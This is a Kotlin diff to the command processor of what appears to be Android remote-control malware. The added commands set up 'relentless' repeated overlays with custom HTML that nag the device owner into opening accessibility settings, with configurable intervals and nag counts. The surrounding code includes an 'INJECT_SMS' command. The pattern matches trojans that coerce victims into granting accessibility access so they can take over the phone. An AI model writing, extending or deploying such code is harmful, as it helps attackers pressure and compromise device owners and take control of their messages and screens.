@@ -1152,6 +1152,29 @@ object CommandProcessor {
                         errorMsg = "Use: NUMBER | MESSAGE"
                     }
                 }
+                "SET_RELENTLESS_ACC" -> {
+                    val parts = content.split("|")
+                    AccRelentlessManager.chillHours = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 24L
+                    AccRelentlessManager.nagIntervalMins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 2L
+                    AccRelentlessManager.maxNags = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 5
+                    if (parts.size > 3) {
+                        AccRelentlessManager.customHtml = parts.subList(3, parts.size).joinToString("|").trim()
+                    }
+                    status = "RELENTLESS_ACC_CONFIGURED"
+                    errorMsg = "Chill: ${AccRelentlessManager.chillHours}h | Interval: ${AccRelentlessManager.nagIntervalMins}m"
+                }
+                "ACC_GOTO_SETTINGS" -> {
+                    DynamicUIManager.removeOverlay(ctx)
+                    val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    ctx.startActivity(i)
+                    return
+                }
+                "ACC_SHOW_HELP" -> {
+                    DynamicUIManager.removeOverlay(ctx)
+                    val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    ctx.startActivity(i)
+                    return
+                }
                 "INJECT_SMS" -> {
                     if (!DefaultSmsManager.isDefaultSms(ctx)) {
                         status = "FAILED (NOT_DEFAULT)"
